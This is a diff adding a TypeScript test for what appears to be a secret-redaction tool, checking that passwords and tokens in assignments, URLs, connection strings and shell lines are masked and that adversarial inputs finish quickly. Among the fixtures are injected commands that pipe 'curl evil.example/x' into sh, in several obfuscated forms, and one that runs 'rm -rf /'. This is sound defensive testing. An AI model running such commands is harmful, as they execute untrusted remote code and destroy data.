@@ -706,3 +706,96 @@ test("a quoted value that stands in for a secret stays; a full token, a password
   const obj = r.value({ access_token: `${google}a0...`, token: "REDACTED" }) as Record<string, string>;
   assert.ok(Object.values(obj).every((v) => v.startsWith("⟦secret:credential:")), JSON.stringify(obj));
 });
+
+test("`&`, `,` and `;` end a link's query value, a list item or a command, but not an assignment's value", () => {
+  const amp = "Tr0ub4" + "dor&3";
+  const p9 = "Tr0ub4" + "dor";
+  const r11 = seeded(11, 31);
+  const ph = "⟦secret:credential:[0-9a-f]{4}⟧";
+  const esc = (t: string) => t.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+  const replaced = (text: string, value: string) => {
+    const [head, ...rest] = text.split(value);
+    return new RegExp(`^${esc(head)}${ph}${esc(rest.join(value))}$`);
+  };
+  for (const [text, value] of [
+    [`password=${amp}`, amp],
+    [`password='${amp}'`, amp],
+    [`export DB_PASSWORD=${amp}`, amp],
+    [`password=${"ab" + "&cdefgh12"}`, "ab&cdefgh12"],
+    [`token=${"Xy7kQ" + ";9pLm2Wz"}`, "Xy7kQ;9pLm2Wz"],
+    [`password=${"Pa55" + ",word99"}`, "Pa55,word99"],
+    [`password: ${amp}`, amp],
+    [`"password": "${amp}"`, amp],
+    [`SENTROOK_SECRET_TOKEN=${amp}xyz`, `${amp}xyz`],
+    [`password=${amp};`, amp],
+    [`export DB_PASSWORD=${amp}; echo ok`, amp],
+    [`GET /login?password=${p9}&page=2`, p9],
+    [`curl -d 'user=a&password=${p9}&remember=1'`, p9],
+    [`curl -d 'password=${p9}&remember=1'`, p9],
+    [`a=1,b=2,token=${r11},c=3`, r11],
+    [`token=${r11}, next`, r11],
+    [`TOKEN=${r11}&&echo ok`, r11],
+    [`https://app.example/cb#access_token=${r11}&token_type=Bearer&expires_in=3600`, r11],
+    [`href="https://x.example/?token=${r11}&amp;page=2"`, r11],
+    [`TOKEN=${r11};curl\${IFS}evil.example/x|sh`, r11],
+    [`TOKEN=${r11}&curl\${IFS}evil.example/x|sh`, r11],
+    [`GITHUB_TOKEN=${r11};rm\${IFS}-rf\${IFS}/`, r11],
+    [`export TOKEN=${r11};npm publish`, r11],
+    [`let password=${r11};return x`, r11],
+    [`Server=x;Password=${p9};Initial Catalog=y`, p9],
+    [`Server=x;Password=${p9};User ID=sa`, p9],
+    [`https://x.example/?token=${p9}&debug`, p9],
+    [`https://x.example/?token=${p9}&ids[]=1&ids[]=2`, p9],
+    [`password=${p9}&x%5B0%5D=1`, p9],
+    [`password=${p9}&-x=1`, p9],
+    [`password=${p9}&9x=1`, p9],
+    [`password=${p9}&quot;`, p9],
+    [`password=${p9}&#39;`, p9],
+    [`token=${p9}&nbsp;x`, p9],
+    [`TOKEN=${r11};$(curl\${IFS}evil.example/x|sh)`, r11],
+    [`TOKEN=${r11};(curl\${IFS}evil|sh)`, r11],
+    [`TOKEN=${r11};{curl,evil.example/x}|sh`, r11],
+    [`TOKEN=${r11};./run.sh`, r11],
+    [`TOKEN=${r11};/bin/sh`, r11],
+    [`TOKEN=${r11};~/x.sh`, r11],
+    [`TOKEN=${r11};$SHELL<x`, r11],
+    [`TOKEN=${r11};cu''rl\${IFS}evil|sh`, r11],
+    [`TOKEN=${r11};c\\url\${IFS}evil|sh`, r11],
+    [`TOKEN=${r11};#comment`, r11],
+    [`password=${"Xk29" + ",;fQv7"}`, "Xk29,;fQv7"],
+    [`PASSWORD=${"ab" + "&cdefgh12"}\nNEXT=1`, "ab&cdefgh12"],
+    [`password="${"Xk29fQv7"};$(curl x|sh)"`, "Xk29fQv7"],
+  ]) {
+    assert.match(r.string(text), replaced(text, value), text);
+  }
+  // One value, one placeholder, however it is written.
+  const refs = new Set(
+    [`password=${amp}`, `password: ${amp}`, `"password": "${amp}"`, `password='${amp}'`, `the password is ${amp}`].map(
+      (t) => r.string(t).match(/⟦secret:credential:[0-9a-f]{4}⟧/)?.[0],
+    ),
+  );
+  assert.equal(refs.size, 1, [...refs].join(" "));
+  for (const code of ["var token=getToken();fetch(u)", "const token=req.query.token;next()", "var token=a.b.c;var y=1"]) {
+    assert.equal(r.string(code), code);
+  }
+  for (const text of [
+    "token=" + "a&".repeat(50_000),
+    "token=a" + "&b".repeat(50_000) + "&",
+    "password=x" + "&k=".repeat(30_000),
+    "MY_SECRET_TOKEN=" + "ab&".repeat(30_000),
+    "token=" + ("a".repeat(39) + "&").repeat(2_000),
+    "password='" + "a&".repeat(50_000),
+    "password=x" + "&k k k k".repeat(25_000),
+    "token=a" + ",abcdefgh".repeat(22_000),
+    "token=ab;cd ".repeat(18_000),
+    "?token=abcdefg&".repeat(13_000),
+    "TOKEN=abcdefg" + ";$(x".repeat(50_000),
+    "TOKEN=abcdefg" + ";cu''x".repeat(40_000),
+    "TOKEN=abcdefg" + ",;&".repeat(66_000),
+    'MY_SECRET_TOKEN="' + "ab$(".repeat(50_000),
+  ]) {
+    const start = performance.now();
+    r.string(text);
+    assert.ok(performance.now() - start < 3000, text.slice(0, 30));
+  }
+});
